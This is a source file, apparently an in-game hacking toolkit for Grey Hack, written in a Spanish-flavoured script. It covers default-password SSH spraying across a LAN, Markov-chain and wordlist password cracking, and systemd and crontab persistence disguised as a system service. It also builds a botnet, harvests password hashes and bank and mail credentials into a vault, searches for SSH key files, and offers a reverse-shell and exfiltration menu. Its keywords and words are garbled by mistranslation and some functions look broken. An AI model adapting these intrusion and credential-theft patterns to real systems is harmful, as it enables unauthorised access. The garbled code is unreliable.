else if (accion == "info") then; sesion_action_info(ip, sesion)
else if (accion == "download") then; sesion_action_download(ip, sesion)
else if (accion == "upload") then; sesion_action_upload(ip, sesion)
else if (accion == "exec") then; sesion_action_exec(ip, sesion)
else if (accion == "adduser") then; sesion_action_adduser(ip, sesion)
else if (accion == "view") then; sesion_action_view_file(ip, sesion)
else if (accion == "list") then; sesion_action_list_dir(ip, sesion)
else if (accion == "ports") then; sesion_action_ports(ip, sesion)
else if (accion == "devices") then; sesion_action_devices(ip, sesion)
else if (accion == "jump") then; sesion_action_jump(ip, sesion)
else if (accion == "scanjump") then; sesion_action_scanjump(ip, sesion)
tarea sesion_action_jump(ip, sesion)
if (typeof(sesion) != "shell") then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "Jump requiere una shell" + "</color>")
        return
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "AUTO-JUMP a " + ip + "..." + "</color>")
resultado = jumping_auto(sesion, ip)
if (resultado) then
        print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Jump realizado a " + ip + "</color>")
else
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se pudo realizar el jump" + "</color>")
end if
tarea sesion_action_scanjump(ip, sesion)
if (typeof(sesion) != "shell") then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "ScanJump requiere una shell" + "</color>")
        return
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "SCAN & JUMP desde " + ip + "..." + "</color>")
comp = sesion.host_computer
router = get_router(ip)
if (not router) then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se pudo obtener router" + "</color>")
        return
end if
dispositivos = router.devices_lan_ip
if (dispositivos.len == 0) then
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "No hay dispositivos in la red local" + "</color>")
        return
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Dispositivos encontrados: " + str(dispositivos.len) + "</color>")
exitos = 0
for target_ip in dispositivos
    if (target_ip == ip) then; siguiente
    if (enjambre.hasIndex(target_ip)) then; siguiente
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Probando " + target_ip + "..." + "</color>")
        passwords = ["root", "toor", "admin", "123456", "password", ""]
    for pwd in passwords
            resultado = get_shell.connect_service(target_ip, 22, "root", pwd)
        if (resultado != null) then
                print("<color=#00ff41>[OK] </color><color=#ffffff>" + "SSH a " + target_ip + " exitoso!" + "</color>")
                enjambre[target_ip] = resultado
                exitos = exitos + 1
end if
end for
end for
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "ScanJump completado: " + str(exitos) + " nuevas sesiones" + "</color>")
tarea sesion_action_files(ip, sesion)
comp = null
if (typeof(sesion) == "shell") then; comp = sesion.host_computer
else if (typeof(sesion) == "computer") then; comp = sesion
if (not comp) then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se pudo obtener computadora." + "</color>")
        return
end if
root = comp.File("/")
if (not root) then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se pudo acceder al sistema de archivos." + "</color>")
        return
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "ARCHIVOS EN " + ip + ":" + "</color>")
listar_archivos(root, "")
tarea listar_archivos(archivo, indent)
if (not archivo) then; return
nombre = archivo.name
if (nombre == "") then; nombre = "/"
tipo_arch = ""
if (archivo.is_directory) then; tipo_arch = "<color=#00e5ff>[DIR]</color>"
else if (archivo.is_binary) then; tipo_arch = "<color=#ffea00>[BIN]</color>"
else; tipo_arch = "<color=#ffffff>[FILE]</color>"
permisos = ""
if (archivo.has_permission("r")) then; permisos = permisos + "r"
if (archivo.has_permission("w")) then; permisos = permisos + "w"
if (archivo.has_permission("x")) then; permisos = permisos + "x"
print(indent + tipo_arch + " " + nombre + " <color=#424242>(" + permisos + ")</color>")
if (archivo.is_directory) then
        hijos = archivo.get_files
    if (hijos) then
        for hijo in hijos
                listar_archivos(hijo, indent + "  ")
end for
end if
end if
tarea sesion_action_info(ip, sesion)
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "INFORMACION DE " + ip + ":" + "</color>")
print("  Tipo: " + typeof(sesion))
if (typeof(sesion) == "shell") then
        comp = sesion.host_computer
        print("  Usuario: " + sesion.user)
        print("  Home: " + sesion.current_dir)
    if (comp) then
            print("  IP Local: " + comp.local_ip)
            print("  IP Publica: " + comp.public_ip)
            print("  Hostname: " + comp.get_name)
end if
else if (typeof(sesion) == "computer") then
            print("  IP Local: " + sesion.local_ip)
            print("  IP Publica: " + sesion.public_ip)
            print("  Hostname: " + sesion.get_name)
else if (typeof(sesion) == "file") then
                print("  Ruta: " + sesion.path)
                print("  Nombre: " + sesion.name)
end if
tarea sesion_action_download(ip, sesion)
comp = null
if (typeof(sesion) == "shell") then; comp = sesion.host_computer
else if (typeof(sesion) == "computer") then; comp = sesion
if (not comp) then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se pudo obtener computadora." + "</color>")
        return
end if
ruta = __nini_pedir("Ruta del archivo remoto: ")
if (ruta == "") then; return
archivo = comp.File(ruta)
if (not archivo) then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "Archivo not encontrado: " + ruta + "</color>")
        return
end if
if (archivo.is_directory) then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se puede descargar un directorio." + "</color>")
        return
end if
contenido = archivo.get_content
if (contenido == null) then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se pudo leer el archivo." + "</color>")
        return
end if
nombre_local = archivo.name
archivo_local = get_shell.host_computer.File(current_path + "/" + nombre_local)
if (archivo_local) then
        archivo_local.set_content(contenido)
else
        get_shell.host_computer.touch(current_path, nombre_local)
        archivo_local = get_shell.host_computer.File(current_path + "/" + nombre_local)
    if (archivo_local) then; archivo_local.set_content(contenido)
end if
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Descargado: " + nombre_local + "</color>")
tarea sesion_action_upload(ip, sesion)
comp = null
if (typeof(sesion) == "shell") then; comp = sesion.host_computer
else if (typeof(sesion) == "computer") then; comp = sesion
if (not comp) then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se pudo obtener computadora." + "</color>")
        return
end if
ruta_local = __nini_pedir("Ruta del archivo local: ")
if (ruta_local == "") then; return
archivo_local = get_shell.host_computer.File(ruta_local)
if (not archivo_local) then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "Archivo local not encontrado." + "</color>")
        return
end if
contenido = archivo_local.get_content
ruta_remota = __nini_pedir("Ruta remota (Enter=/tmp/): ")
if (ruta_remota == "") then; ruta_remota = "/tmp/"
nombre = archivo_local.name
comp.touch(ruta_remota, nombre)
archivo_remoto = comp.File(ruta_remota + nombre)
if (archivo_remoto) then
        archivo_remoto.set_content(contenido)
        print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Subido: " + ruta_remota + nombre + "</color>")
else
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se pudo subir el archivo." + "</color>")
end if
tarea sesion_action_exec(ip, sesion)
if (typeof(sesion) != "shell") then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "Esta accion requiere una shell." + "</color>")
        return
end if
comando = __nini_pedir("Comando a ejecutar: ")
if (comando == "") then; return
sesion.launch("/bin/sh", "-c '" + comando + "'")
print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Comando ejecutado." + "</color>")
tarea sesion_action_adduser(ip, sesion)
comp = null
if (typeof(sesion) == "shell") then; comp = sesion.host_computer
else if (typeof(sesion) == "computer") then; comp = sesion
if (not comp) then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se pudo obtener computadora." + "</color>")
        return
end if
usuario = __nini_pedir("Nuevo usuario: ")
if (usuario == "") then; return
pass = __nini_pedir("Password: ")
if (pass == "") then; return
resultado = comp.create_user(usuario, pass)
if (resultado == 1) then; exito("Usuario creado: " + usuario)
else; error("No se pudo crear el usuario.")
tarea sesion_action_view_file(ip, sesion)
if (typeof(sesion) != "file") then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "Esta accion requiere un archivo." + "</color>")
        return
end if
contenido = sesion.get_content
if (contenido == null) then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se pudo leer el archivo." + "</color>")
        return
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "CONTENIDO DE " + sesion.path + ":" + "</color>")
print(contenido)
tarea sesion_action_list_dir(ip, sesion)
if (typeof(sesion) != "file" or not sesion.is_directory) then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "Esta accion requiere un directorio." + "</color>")
        return
end if
hijos = sesion.get_files
if (not hijos or hijos.len == 0) then
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Directorio vacio." + "</color>")
        return
end if
columnas = ["Nombre", "Tipo", "Tamanio"]
filas = []
for hijo in hijos
        tipo = "FILE"
    if (hijo.is_directory) then; tipo = "DIR"
    if (hijo.is_binary) then; tipo = "BIN"
        filas.push([hijo.name, tipo, str(hijo.size)])
end for
print(__nini_tabla(columnas, filas))
tarea sesion_action_ports(ip, sesion)
if (typeof(sesion) != "number" and typeof(sesion) != "router") then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "Esta accion requiere un router." + "</color>")
        return
end if
puertos = sesion.used_ports
if (not puertos or puertos.len == 0) then
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "No hay puertos." + "</color>")
        return
end if
columnas = ["Puerto", "Estado", "Servicio", "IP LAN"]
filas = []
for port in puertos
        estado = "closed"
    if (not port.is_closed) then; estado = "open"
        filas.push([port.port_number, estado, sesion.port_info(port), port.get_lan_ip])
end for
print(__nini_tabla(columnas, filas))
tarea sesion_action_devices(ip, sesion)
if (typeof(sesion) != "number" and typeof(sesion) != "router") then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "Esta accion requiere un router." + "</color>")
        return
end if
devices = sesion.devices
if (not devices or devices.len == 0) then
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "No hay dispositivos." + "</color>")
        return
end if
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "DISPOSITIVOS:" + "</color>")
for dev in devices
        print("  - " + dev)
end for
_chain_samples = [
"password", "123456", "qwerty", "admin", "letmein",
"welcome", "monkey", "dragon", "master", "login",
"shadow", "sunshine", "princess", "football", "baseball",
"iloveyou", "trustno1", "superman", "michael", "charlie",
"access", "hello", "ranger", "thomas", "hunter",
"buster", "soccer", "hockey", "george", "pepper",
"killer", "daniel", "andrew", "joshua", "michelle",
"starwars", "freedom", "summer", "ashley", "passw0rd",
"matrix", "secret", "orange", "computer", "pass123",
"password1", "qwerty123", "abc123", "password123", "admin123",
]
_chain_pregens = [
"root", "pass", "123", "abc", "qwerty", "admin", "letmein",
"abc123", "password1", "123456", "qwerty123", "admin123",
"root123", "toor", "changeme", "default",
]
    _chain_build = function(samples, order)
        chains = {}
    for sample in samples
            mayus = sample.upper
        if (mayus.len <= order) then; siguiente
        for i in range(0, mayus.len - order - 1)
                token = mayus[i : i + order]
                next_char = mayus[i + order]
            if (not chains.hasIndex(token)) then; chains[token] = []
            if (chains[token].indexOf(next_char) == null) then; chains[token].push(next_char)
end for
end for
end function
    _chain_next = function(chains, token)
    if (not chains.hasIndex(token)) then; return null
        return chains[token][floor(rnd * chains[token].len)]
end function
    _chain_generate = function(chains, token, max_len, order)
        password = token.lower
    while (password.len < max_len)
            sub = password[password.len - order :].upper
            next_c = _chain_next(chains, sub)
        if (next_c == null) then; break
            password = password + next_c.lower
end while
        return password
end function
    _chain_try = function(sesion, user, password, ip, port)
    if (ip == "" or ip == null) then
            return get_shell(user, password)
end if
        return get_shell.connect_service(ip, port, user, password)
end function
tarea chainsaw_crack(sesion, user, ip, port)
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "CHAINSAW - Markov Chain Cracker" + "</color>")
order = 3
max_len = 12
intentos = 0
chains = _chain_build(_chain_samples, order)
for pwd in _chain_pregens
        intentos = intentos + 1
        resultado = _chain_try(sesion, user, pwd, ip, port)
    if (resultado != null) then
            print("<color=#00ff41>[OK] </color><color=#ffffff>" + "PASSWORD: " + pwd + "</color>")
            return resultado
end if
end for
for token in chains.indexes
        pwd = _chain_generate(chains, token, max_len, order)
    if (pwd.len < 3) then; siguiente
        intentos = intentos + 1
        resultado = _chain_try(sesion, user, pwd, ip, port)
    if (resultado != null) then
            print("<color=#00ff41>[OK] </color><color=#ffffff>" + "PASSWORD: " + pwd + "</color>")
            return resultado
end if
end for
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "ChainSaw: " + str(intentos) + " intentos" + "</color>")
return null
tarea modulo_escalada_analizar
if (globals.objetivo_actual == null) then
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Escaneando sistema local..." + "</color>")
        sesion = get_shell
        ip = ""
        port = 0
else
    if (not enjambre.hasIndex(globals.objetivo_actual)) then
            print("<color=#ff1744>[X] </color><color=#ffffff>" + "No hay sesion" + "</color>")
            return
end if
        sesion = enjambre[globals.objetivo_actual]
        ip = globals.objetivo_actual
        port = 22
end if
if (not sesion) then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "No hay sesion activa" + "</color>")
        return
end if
usuario = "root"
if (typeof(sesion) == "shell") then; usuario = sesion.user
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Usuario: " + usuario + "</color>")
if (usuario == "root") then
        print("<color=#ffea00>[!] </color><color=#ffffff>" + "Ya eres root!" + "</color>")
        return
end if
opciones = [
{"label": "Analizar PrivEsc", "cmd": "analizar"},
{"label": "ChainSaw crack root", "cmd": "chainsaw"},
{"label": "Fuerza bruta SSH", "cmd": "brute"},
]
accion = menu_interactivo("ESCALADA", opciones)
if (not accion) then; return
if (accion == "analizar") then; modulo_escalada_vector(sesion)
else if (accion == "chainsaw") then
            resultado = chainsaw_crack(sesion, "root", ip, port)
        if (resultado != null) then
                print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Ahora eres root!" + "</color>")
            if (ip != "") then; enjambre[ip] = resultado
        else
                print("<color=#ffea00>[!] </color><color=#ffffff>" + "No se encontro password" + "</color>")
end if
else if (accion == "brute") then; modulo_escalada_brute(sesion, "root", ip, port)
tarea modulo_escalada_vector(sesion)
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "ANALIZANDO VECTORES..." + "</color>")
vectores = []
comp = null
if (typeof(sesion) == "shell") then; comp = sesion.host_computer
else if (typeof(sesion) == "computer") then; comp = sesion
if (not comp) then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "Sin acceso a computadora" + "</color>")
        return
end if
root = comp.File("/")
if (not root) then
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "Sin acceso a filesystem" + "</color>")
        return
end if
suids = root.find_permissive("s", true)
if (suids) then
    for f in suids
        if (f.is_binary) then; vectores.push({"path": f.path, "type": "SUID", "severity": "MEDIA"})
end for
end if
etc = comp.File("/etc")
if (etc and etc.get_files) then
    for f in etc.get_files
        if (f.has_permission("w")) then; vectores.push({"path": f.path, "type": "WRITEABLE_ETC", "severity": "ALTA"})
end for
end if
if (vectores.len == 0) then
        print("<color=#ffea00>[!] </color><color=#ffffff>" + "No hay vectores detectados" + "</color>")
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Tip: Usa ChainSaw" + "</color>")
else
        print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Vectores: " + str(vectores.len) + "</color>")
        columnas = ["Ruta", "Tipo", "Severidad"]
        filas = []
    for v in vectores
            color = "<color=#00ff41>"
        if (v.severity == "ALTA") then; color = "<color=#ff3131>"
        else if (v.severity == "MEDIA") then; color = "<color=#ffea00>"
            filas.push([v.path, v.type, color + v.severity + "</color>"])
end for
        print(__nini_tabla(columnas, filas))
end if
tarea modulo_escalada_brute(sesion, user, ip, port)
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "FUERZA BRUTA - " + user + "</color>")
passwords = [
"123456", "password", "qwerty", "abc123", "monkey", "letmein", "dragon",
"iloveyou", "sunshine", "princess", "football", "shadow", "michael",
"admin", "root", "toor", "pass", "changeme", "test", "guest",
"password1", "password123", "admin123", "root123", "qwerty123",
"ranger", "thomas", "hunter", "buster", "soccer", "daniel",
]
for pwd in passwords
        resultado = _chain_try(sesion, user, pwd, ip, port)
    if (resultado != null) then
            print("<color=#00ff41>[OK] </color><color=#ffffff>" + "PASSWORD: " + pwd + "</color>")
        if (ip != "") then; enjambre[ip] = pwd
            return resultado
end if
end for
print("<color=#ffea00>[!] </color><color=#ffffff>" + "No se encontro password" + "</color>")
return null
    modulo_persistencia_configurar = function()
    if (not globals.objetivo_actual) then; error("No hay objetivo."); return
        opciones = [
        {"label": "Backdoor (Metaxploit)", "cmd": "backdoor"},
        {"label": "Cron job", "cmd": "cron"},
        {"label": "Ver persistencias", "cmd": "list"},
        ]
        modo = menu_interactivo("PERSISTENCIA", opciones)
    if (not modo) then; return
    if (modo == "backdoor") then; persistencia_instalar_backdoor()
    else if (modo == "cron") then; persistencia_cron()
    else if (modo == "list") then; persistencia_ver()
end function
    persistencia_instalar_backdoor = function()
    if (not globals.objetivo_actual) then; error("No hay objetivo."); return
        comp = obtener_computadora_objetivo()
    if (not comp) then; error("No hay sesión."); return
        lib_folder = comp.File("/lib")
    if (not lib_folder or not lib_folder.has_permission("w")) then; error("Sin permisos root."); return
        nombre = "revenant_daemon"
        ruta = "/lib/systemd/system/" + nombre + ".service"
        contenido = "[Unit]\nDescription=System Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/sh -c 'while true; do wait 60; done'\nRestart=always\nUser=root\n\n[Install]\nWantedBy=multi-user.target"
        comp.touch("/lib/systemd/system/", nombre + ".service")
        archivo = comp.File(ruta)
    if (archivo) then
            archivo.set_content(contenido)
            print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Backdoor instalado: " + ruta + "</color>")
    else; error("No se pudo crear.")
end if
end function
    persistencia_cron = function()
    if (not globals.objetivo_actual) then; error("No hay objetivo."); return
        comp = obtener_computadora_objetivo()
    if (not comp) then; error("No hay sesión."); return
        cmd = __nini_pedir("Comando: ")
    if (cmd == "") then; return
        cron = comp.File("/etc/crontab")
    if (not cron or not cron.has_permission("w")) then; error("Sin permisos."); return
        cron.set_content(cron.get_content + char(10) + "@reboot " + cmd)
        print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Cron job agregado." + "</color>")
end function
    persistencia_ver = function()
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Persistencia activa in el objetivo." + "</color>")
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Usa 'vault' for ver credenciales." + "</color>")
end function
    modulo_botnet_persistir = function()
    if (enjambre.len == 0) then; error("Enjambre vacío."); return
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Instalando in " + str(enjambre.len) + " nodos..." + "</color>")
    for nodo in enjambre
            ip = nodo.key
            sesion = nodo.value
            if (typeof(sesion) == "shell") then
    computer_node = sesion.host_computer
            else
    computer_node = sesion
            end if
        if (computer_node and computer_node.has_permission("w")) then
                computer_node.touch("/lib/systemd/system/", "revenant.service")
                archivo = computer_node.File("/lib/systemd/system/revenant.service")
            if (archivo) then
                    archivo.set_content("[Unit]\nDescription=Revenant\n[Service]\nExecStart=/bin/sh")
                    print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Instalado in " + ip + "</color>")
end if
        else; error("Sin permisos in " + ip)
end if
end for
end function
_vault_data = {"creds": {}, "vulns": {}}
_vault_k = "R3V3N4NT_S3CUR3"
_version = "STABLE"
    inicializar_vault = function()
        p = "/var/revenant"
    if (not get_shell.host_computer.File(p)) then; p = "./"
        ruta = p + "/vault.db"
    if (get_shell.host_computer.File(ruta)) then
            f = get_shell.host_computer.File(ruta)
            contenido = f.get_content
        if (contenido.len > 0) then
                _vault_data = deserializar_vault(contenido)
                print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Vault cargado: " + _vault_data.creds.len + " creds, " + _vault_data.vulns.len + " vulns." + "</color>")
end if
    else
            print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Iniciando nuevo Vault en: " + ruta + "</color>")
end if
end function
    cifrar = function(txt)
        res = ""
        for i in range(0, txt.len - 1)
            v = __nini_xor(code(txt[i]), code(_vault_k[i % _vault_k.len]))
            res = res + str(v) + ","
end for
        return res
end function
    descifrar = function(txt)
        res = ""
        partes = txt.split(",")
        for i in range(0, partes.len - 1)
            p = partes[i]
        if (p == "") then; continue
            res = res + char(__nini_xor(val(p), code(_vault_k[res.len % _vault_k.len])))
end for
        return res
end function
    serializar_vault = function(data)
        return cifrar(str(data))
end function
    deserializar_vault = function(txt)
        raw = descifrar(txt)
        return val(raw)
end function
    guardar_vault = function()
        p = "/var/revenant"
    if (not get_shell.host_computer.File(p)) then; p = "/home/" + active_user
        ruta = p + "/vault.db"
        f = get_shell.host_computer.File(ruta)
    if (not f) then
            get_shell.host_computer.touch(p, "vault.db")
            f = get_shell.host_computer.File(ruta)
end if
    if (f) then
            f.set_content(serializar_vault(_vault_data))
    else
            print("<color=#ff1744>[X] </color><color=#ffffff>" + "Fallo de persistencia: El Vault not puede escribirse in " + p + "</color>")
end if
end function
    guardar_credencial = function(ip, usuario, clave, priv, lan)
        k = (ip + "_" + usuario + "_" + priv).lower()
        _vault_data.creds[k] = {"ip": ip, "user": usuario, "pass": clave, "priv": priv, "lan": lan}
        guardar_vault()
        print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Vault actualizado: " + usuario + "@" + ip + "</color>")
end function
    listar_credenciales = function()
        columnas = ["IP", "Usuario", "Clave", "Priv", "LAN"]
        filas = []
        for c_entry in _vault_data.creds
            c = c_entry.value
            filas.push([c.ip, c.user, c.pass, c.priv, c.lan])
end for
        print(__nini_tabla(columnas, filas))
end function
    cachear_vulnerabilidad = function(lib, ver, area, vuln)
        k = (lib + "_" + ver).lower()
    if (not _vault_data.vulns.hasIndex(k)) then; _vault_data.vulns[k] = []
        _vault_data.vulns[k].push({"mem": area, "pass": vuln})
        guardar_vault()
end function
    obtener_vulnerabilidades = function(lib, ver)
        k = (lib + "_" + ver).lower()
    if (_vault_data.vulns.hasIndex(k)) then; return _vault_data.vulns[k]
        return []
end function
    modulo_intel_saquear = function()
    if (not globals.objetivo_actual) then; error("Fije un objetivo primero."); return
        comp = obtener_computadora_objetivo()
    if (not comp) then; error("No hay sesión activa."); return
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Extrayendo intel de: " + globals.objetivo_actual + "</color>")
        passwd = comp.File("/etc/passwd")
    if (passwd and not passwd.is_binary) then
            print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Procesando /etc/passwd..." + "</color>")
            cont = 0
        for l in passwd.get_content.split(char(10))
            if (l.indexOf(":") == null) then; continue
                partes = l.split(":")
                hash = partes[1]
            if (hash == "x" or hash == "*") then; continue
                clave = __nini_crackear_hash(hash)
            if (clave) then
                    guardar_credencial(globals.objetivo_actual, partes[0], clave, "linux", comp.local_ip)
                    cont = cont + 1
end if
end for
            print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Credenciales: " + str(cont) + "</color>")
end if
        home = comp.File("/home")
    if (home) then
            print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Explorando usuarios..." + "</color>")
            cont_bancos = 0; cont_correos = 0
        for user_dir in home.get_folders
                usr = user_dir.name
                banco = comp.File("/home/" + usr + "/Config/Bank.txt")
            if (banco) then
                for l in banco.get_content.split(char(10))
                    if (l.indexOf(":") == null) then; continue
                        p = l.split(":")
                        pass_dec = __nini_crackear_hash(p[1])
                    if (pass_dec) then
                            guardar_credencial(globals.objetivo_actual, p[0], pass_dec, "banco", comp.local_ip)
                            cont_bancos = cont_bancos + 1
end if
end for
end if
                mail = comp.File("/home/" + usr + "/Config/Mail.txt")
            if (mail) then
                for l in mail.get_content.split(char(10))
                    if (l.indexOf(":") == null) then; continue
                        p = l.split(":")
                        pass_dec = __nini_crackear_hash(p[1])
                    if (pass_dec) then
                            guardar_credencial(globals.objetivo_actual, p[0], pass_dec, "correo", comp.local_ip)
                            cont_correos = cont_correos + 1
end if
end for
end if
end for
            print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Bancos: " + str(cont_bancos) + " | Correos: " + str(cont_correos) + "</color>")
end if
        print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Intel extraido." + "</color>")
end function
    intel_buscar_en_directorio = function(comp, ruta, exts, prof)
        resultados = []
        carpeta = comp.File(ruta)
    if (not carpeta or not carpeta.is_folder) then; return resultados
    if (carpeta.get_folders) then
        for fd in carpeta.get_folders
            if (prof > 0) then; resultados = resultados + intel_buscar_en_directorio(comp, fd.path, exts, prof - 1)
end for
end if
    if (carpeta.get_files) then
        for f in carpeta.get_files
            for ext in exts
                if (f.name.indexOf(ext) != null) then
                        resultados.push({"ruta": f.path, "nombre": f.name, "tamano": f.size})
                        break
end if
end for
end for
end if
        return resultados
end function
    modulo_intel_buscar_archivos = function()
    if (not globals.objetivo_actual) then; error("No hay objetivo."); return
        comp = obtener_computadora_objetivo()
    if (not comp) then; error("No hay sesión."); return
        opciones = [
        {"label": "Claves SSH", "cmd": "keys"},
        {"label": "Contrasenas", "cmd": "passwords"},
        {"label": "Configuraciones", "cmd": "configs"},
        {"label": "Backups", "cmd": "backup"},
        ]
        modo = menu_interactivo("BUSCAR ARCHIVOS", opciones)
    if (not modo) then; return
if (modo == "keys") then
    exts = [".pem", ".key", ".ppk", ".crt", ".cer"]
else if (modo == "passwords") then
    exts = [".kdb", ".kdbx", ".1pif", ".psafe3"]
else if (modo == "configs") then
    exts = [".conf", ".config", ".cfg", ".ini"]
else
    exts = [".bak", ".backup", ".old", ".save", ".swp"]
end if
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Buscando..." + "</color>")
        resultados = []
    for ruta in ["/home", "/root", "/etc", "/var"]
            resultados = resultados + intel_buscar_en_directorio(comp, ruta, exts, 2)
end for
    if (resultados.len == 0) then; info("No se encontraron archivos.")
    else; info("Encontrados: " + str(resultados.len)); dibujar_ventana("RESULTADOS", str(resultados))
end function
    modulo_intel_brute_force = function()
        opciones = [
        {"label": "SSH", "cmd": "ssh"},
        {"label": "FTP", "cmd": "ftp"},
        {"label": "Crack passwd", "cmd": "passwd"},
        ]
        modo = menu_interactivo("FUERZA BRUTA", opciones)
    if (not modo) then; return
    if (modo == "ssh") then; info("SSH brute not disponible in GH. Usa Metaxploit.")
    else if (modo == "ftp") then; intel_ftp_anonimo()
    else if (modo == "passwd") then; intel_crack_passwd()
end function
    intel_ftp_anonimo = function()
        host = globals.objetivo_actual
    if (not host) then; host = __nini_pedir("Host FTP: "); if (host == "") then return
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Intentando acceso anonimo..." + "</color>")
        metax = include_lib("/lib/metaxploit.so")
    if (metax) then
            sesion = metax.net_use(host, 21)
        if (sesion) then; enjambre[host] = sesion; exito("Acceso anonimo!"); return
end if
        print("<color=#ff1744>[X] </color><color=#ffffff>" + "Acceso fallido." + "</color>")
end function
    intel_crack_passwd = function()
        comp = obtener_computadora_objetivo()
    if (not comp) then; error("No hay sesión."); return
        passwd = comp.File("/etc/passwd")
    if (not passwd or passwd.is_binary) then; error("No se pudo leer."); return
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Crackeando..." + "</color>")
        cont = 0
    for l in passwd.get_content.split(char(10))
        if (l.indexOf(":") == null) then; continue
            p = l.split(":")
            hash = p[1]
        if (hash == "x" or hash == "*") then; continue
            clave = __nini_crackear_hash(hash)
        if (clave) then
                guardar_credencial(globals.objetivo_actual, p[0], clave, "linux", comp.local_ip)
                cont = cont + 1
end if
end for
        print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Crackeadas: " + str(cont) + "</color>")
end function
    modulo_exfil_menu = function()
    if (globals.objetivo_actual == null) then
            print("<color=#ff1744>[X] </color><color=#ffffff>" + "No hay objetivo seleccionado." + "</color>")
            return
end if
        opciones = [
        {"label": "Download (Objetivo -> Local)", "cmd": "download"},
        {"label": "Upload (Local -> Objetivo)", "cmd": "upload"},
        {"label": "Reverse Shell", "cmd": "shell"},
        {"label": "Payloads", "cmd": "payload"},
        ]
        modo = menu_interactivo("MENÚ DE EXFILTRACIÓN v2", opciones)
    if (not modo) then; return
    if (modo == "download") then
            modulo_exfil_download()
    else if (modo == "upload") then
                modulo_exfil_upload()
    else if (modo == "shell") then
                    modulo_exfil_reverse_shell()
    else if (modo == "payload") then
                        modulo_payloads_generar()
end if
end function
    modulo_exfil_download = function()
    if (globals.objetivo_actual == null) then
            print("<color=#ff1744>[X] </color><color=#ffffff>" + "No hay objetivo." + "</color>")
            return
end if
        ruta_remota = __nini_pedir("Ruta del archivo in el objetivo: ")
    if (ruta_remota == "") then; return
        ruta_local = __nini_pedir("Ruta local de destino: ")
    if (ruta_local == "") then; ruta_local = "./downloads"
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Descargando " + ruta_remota + "..." + "</color>")
        sesion = null
    if (enjambre.hasIndex(globals.objetivo_actual)) then
            sesion = enjambre[globals.objetivo_actual]
end if
    if (sesion) then
            archivo = sesion.host_computer.File(ruta_remota)
        if (archivo) then
                contenido = archivo.get_content
                print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Archivo descargado: " + contenido.len + " bytes" + "</color>")
                print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Download completado." + "</color>")
        else
                print("<color=#ff1744>[X] </color><color=#ffffff>" + "Archivo not encontrado." + "</color>")
end if
    else
            print("<color=#ff1744>[X] </color><color=#ffffff>" + "No hay sesion activa for el objetivo." + "</color>")
end if
end function
    modulo_exfil_upload = function()
    if (globals.objetivo_actual == null) then
            print("<color=#ff1744>[X] </color><color=#ffffff>" + "No hay objetivo." + "</color>")
            return
end if
